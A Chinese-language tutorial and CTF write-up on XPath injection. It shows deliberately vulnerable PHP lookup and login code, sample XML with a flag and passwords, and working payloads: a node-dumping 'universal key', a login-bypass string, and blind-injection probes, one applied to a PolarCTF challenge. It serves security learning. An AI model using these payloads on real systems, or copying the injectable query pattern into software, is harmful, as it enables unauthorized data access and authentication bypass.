# Xpath注入

这里学习一下xpath注入

```undefined
xpath其实是前端匹配树的内容 爬虫用的挺多的
```

 [XPATH注入学习 - 先知社区](https://xz.aliyun.com/t/7791) 

## 查询简单xpath注入

index.php

```php
<?php
if(file_exists('t3stt3st.xml')) {
$xml = simplexml_load_file('t3stt3st.xml');
$user=$_GET['user'];
$query="user/username[@name='".$user."']";
$ans = $xml->xpath($query);
foreach($ans as $x => $x_value)
{
echo "2";
echo $x.":  " . $x_value;
echo "<br />";
}
}
?>
```

t3stt3st.xml

```cobol
<?xml version="1.0" encoding="utf-8"?>
<root1>
<user>
<username name='user1'>user1</username>
<key>KEY:1</key>
<username name='user2'>user2</username>
<key>KEY:2</key>
<username name='user3'>user3</username>
<key>KEY:3</key>
<username name='user4'>user4</username>
<key>KEY:4</key>
<username name='user5'>user5</username>
<key>KEY:5</key>
<username name='user6'>user6</username>
<key>KEY:6</key>
<username name='user7'>user7</username>
<key>KEY:7</key>
<username name='user8'>user8</username>
<key>KEY:8</key>
<username name='user9'>user9</username>
<key>KEY:9</key>
</user>
<hctfadmin>
<username name='hctf1'>hctf</username>
<key>flag:hctf{Dd0g_fac3_t0_k3yboard233}</key>
</hctfadmin>
</root1>
```

首先传递最简单的

```cobol
http://127.0.0.1:3000/dir.php?user=user1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e34d037f02369040c150e89a7a238a66.png" alt="" style="max-height:669px; box-sizing:content-box;" />


可以发现获取到了内容

这里我们如果存在报错的话我们可以使用 '; 测试

```cobol
http://127.0.0.1:3000/dir.php?user=user1%27;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/db3645f32348b3aca73018ea1dd67a0f.png" alt="" style="max-height:664px; box-sizing:content-box;" />


我们首先看看这个时候的注入内容

```perl
$query="user/username[@name='".$user."']";
 
 
$query="user/username[@name='user1';']";
```

然后我们开始测试

```cobol
127.0.0.1:3000/dir.php?user=user1' or '1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fbb8d080bdd3843b599fa0c878de5d74.png" alt="" style="max-height:672px; box-sizing:content-box;" />


发现就实现了注入

这里xpath中还存在一个万能钥匙

类似于 ' or '1'='1'# 的

```csharp
']|//*|//*['
```

```cobol
http://127.0.0.1:3000/dir.php?user=%27]|//*|//*[%27
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5a4001a38af2dd413de32b51713b8c62.png" alt="" style="max-height:716px; box-sizing:content-box;" />


发现所有的东西都出来了

这里的原理是

```cobol
 
 
$query="user/username[@name='']|//*|//*['']";
 
 
首先通过闭合[@name='']  
 
 
//* 这里不是注释哦 是查询所有的节点
 
//*[''] 这里是查询所有文本为空的节点 
 
然后通过 | 符号进行链接
 
这样就是一个查询全部节点的payload了
```

这里存在一个题目 PolarD&N的 注入

## PolarD&N的 注入

这道题就是直接构造

```cobol
http://8371c06a-96fa-4013-be20-c53a2fbfe512.www.polarctf.com:8090/?id=%27]|//*|//*[%27
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7d6c436b705b178ab72818be75c40338.png" alt="" style="max-height:445px; box-sizing:content-box;" />


这里有个问题就是如何知道是xpath注入 我认为应该是拼接做题经验，并且测试过sqlssti这些都无法注入

## xpath登入注入

login.php:

```cobol
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
</head>
<body>
<form method="POST">
username：
<input type="text" name="username">
</p>
password：
<input type="password" name="password">
</p>
<input type="submit" value="登录" name="submit">
</p>
</form>
</body>
</html>
<?php
if(file_exists('test.xml')){
$xml=simplexml_load_file('test.xml');
if($_POST['submit']){
$username=$_POST['username'];
$password=$_POST['password'];
$x_query="/accounts/user[username='{$username}' and password='{$password}']";
$result = $xml->xpath($x_query);
if(count($result)==0){
echo '登录失败';
}else{
echo "登录成功";
$login_user = $result[0]->username;
echo "you login as $login_user";
}
}
}
?>
```

test.xml

```cobol
<?xml version="1.0" encoding="UTF-8"?>
<accounts>
<user id="1">
<username>Twe1ve</username>
<email>admin@xx.com</email>
<accounttype>administrator</accounttype>
<password>P@ssword123</password>
</user>
<user id="2">
<username>test</username>
<email>tw@xx.com</email>
<accounttype>normal</accounttype>
<password>123456</password>
</user>
</accounts>
```

首先查看这里的注入语句

```php
$x_query="/accounts/user[username='{$username}' and password='{$password}']";
```

可以发现可以通过单引号注入

```php
$x_query="/accounts/user[username='1'or 1=1 or ''='' and password='{$password}']";
```

这样不就注入成功了

所以payload

```cobol
1'or 1=1 or ''='
```

## xpath盲注

首先我们需要探测是有多少个节点

```csharp
'or count(/)=1  or ''='  登入成功
 
'or count(/)=2  or ''='  登入失败
```

可以确定只有一个节点

然后就是判断节点的长度

```csharp
'or string-length(name(/*[1]))=8 or ''='  登入成功
 
'or string-length(name(/*[1]))=2 or ''='  登入失败
```

 [XPATH注入学习 - 先知社区](https://xz.aliyun.com/t/7791) 这里写的很详细了